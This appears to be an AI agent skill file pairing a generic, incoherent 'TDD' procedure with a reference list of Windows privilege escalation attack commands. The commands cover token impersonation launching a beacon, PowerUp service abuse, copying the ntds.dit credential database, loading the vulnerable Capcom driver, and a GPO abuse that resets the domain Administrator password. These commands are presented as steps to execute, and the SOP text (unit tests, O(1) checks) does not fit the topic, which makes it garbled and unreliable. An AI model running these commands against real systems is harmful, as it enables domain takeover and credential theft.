---
name: windows-privilege-escalation
description: Use when executing windows privilege escalation protocols within the security sector.
---

# Windows Privilege Escalation: Execution Protocol

## ⚙️ Overview
This protocol defines the exact standards for implementing Windows Privilege Escalation. By following this strict operational pattern, the engine guarantees deterministic execution, high performance, and complete adherence to all architectural guardrails established by the system design.

## 🛠️ Implementation SOP
Follow this step-by-step TDD procedure to execute the protocol:

- **Step 1: Baseline Context**: Verify the operational environment. Ensure required tools (like Python, Node, TS, or native CLI) are accessible before injecting new logic.
- **Step 2: Apply the Pattern**: Implement the core windows privilege escalation logic directly into the active system context.
- **Step 3: Enforce Constraints**: Check for syntax errors, injection vulnerabilities, and performance bottlenecks (`O(1)` compliance).
- **Step 4: Execute Test Suite**: Run `npm run test` or the local testing framework to ensure the logic passes all regression checks.
- **Step 5: Document and Commit**: Update the session walkthrough and sync the telemetry logs for the security sector.

---

## 📚 Reference Material

# Windows Privilege Escalation

#### 1. Token Impersonation

```powershell
# Using SweetPotato (SeImpersonatePrivilege)
execute-assembly sweetpotato.exe -p beacon.exe

# Using SharpImpersonation
SharpImpersonation.exe user:<user> technique:ImpersonateLoggedOnuser
```

#### 2. Service Abuse

```powershell
# Using PowerUp
. .\PowerUp.ps1
Invoke-ServiceAbuse -Name 'vds' -UserName 'domain\user1'
Invoke-ServiceAbuse -Name 'browser' -UserName 'domain\user1'
```

#### 3. Abusing SeBackupPrivilege

```powershell
import-module .\SeBackupPrivilegeUtils.dll
import-module .\SeBackupPrivilegeCmdLets.dll
Copy-FileSebackupPrivilege z:\Windows\NTDS\ntds.dit C:\temp\ntds.dit
```

#### 4. Abusing SeLoadDriverPrivilege

```powershell
# Load vulnerable Capcom driver
.\eoploaddriver.exe System\CurrentControlSet\MyService C:\test\capcom.sys
.\ExploitCapcom.exe
```

#### 5. Abusing GPO

```powershell
.\SharpGPOAbuse.exe --AddComputerTask --Taskname "Update" `
  --Author DOMAIN\<USER> --Command "cmd.exe" `
  --Arguments "/c net user Administrator Password!@# /domain" `
  --GPOName "ADDITIONAL DC CONFIGURATION"
```

---